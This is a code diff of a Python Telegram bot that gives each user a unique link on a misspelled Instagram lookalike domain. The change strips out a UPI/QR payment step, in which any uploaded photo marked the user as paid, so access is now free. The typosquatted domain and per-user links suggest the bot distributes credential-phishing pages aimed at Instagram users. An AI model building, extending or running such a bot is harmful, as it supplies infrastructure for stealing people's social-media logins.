@@ -41,23 +41,10 @@ async def start(update: Update, context: CallbackContext):
     )
 
 async def startbot(update: Update, context: CallbackContext):
-    await update.message.reply_text(
-        "\U0001F4B0 Choose a payment method:\n"
-        "📌 /getqr - Get QR Code\n"
-        "📌 /payusingupi - Pay using UPI"
-    )
-
-async def payusingupi(update: Update, context: CallbackContext):
-    await update.message.reply_text("💳 Please pay using UPI and upload a screenshot.")
-
-async def getqr(update: Update, context: CallbackContext):
-    await update.message.reply_text("📸 Scan this QR to pay and upload a screenshot.")
-
-async def upload_screenshot(update: Update, context: CallbackContext):
     user_id = update.message.chat_id
     user_data[user_id] = {"paid": True}
     await update.message.reply_text(
-        "✅ Payment verified!\n\nChoose an option:\n"
+        "✅ You have access!\n\nChoose an option:\n"
         "🔗 /getlink - Get your link\n"
         "🗑️ /clearchat - Clear chat\n"
         "❌ /closebot - Close bot"
@@ -69,7 +56,7 @@ async def getlink(update: Update, context: CallbackContext):
         unique_link = f"https://insstagram-4pwg.onrender.com/{user_id}"
         await update.message.reply_text(f"🔗 Here is your link: {unique_link}")
     else:
-        await update.message.reply_text("⚠️ Please complete the payment first.")
+        await update.message.reply_text("⚠️ Please start the bot first.")
 
 async def clearchat(update: Update, context: CallbackContext):
     user_id = update.message.chat_id
@@ -81,7 +68,7 @@ async def clearchat(update: Update, context: CallbackContext):
         except Exception as e:
             logger.error(f"Failed to delete message {update.message.message_id - i}: {e}")
 
-    # Clear user payment data
+    # Clear user data
     if user_id in user_data:
         del user_data[user_id]
 
@@ -95,9 +82,6 @@ async def closebot(update: Update, context: CallbackContext):
 telegram_app.add_handler(CommandHandler("start", start))
 telegram_app.add_handler(CommandHandler("startbot", startbot))
 telegram_app.add_handler(CommandHandler("buypremium", startbot))
-telegram_app.add_handler(CommandHandler("payusingupi", payusingupi))
-telegram_app.add_handler(CommandHandler("getqr", getqr))
-telegram_app.add_handler(MessageHandler(filters.PHOTO, upload_screenshot))
 telegram_app.add_handler(CommandHandler("getlink", getlink))
 telegram_app.add_handler(CommandHandler("clearchat", clearchat))
 telegram_app.add_handler(CommandHandler("closebot", closebot))
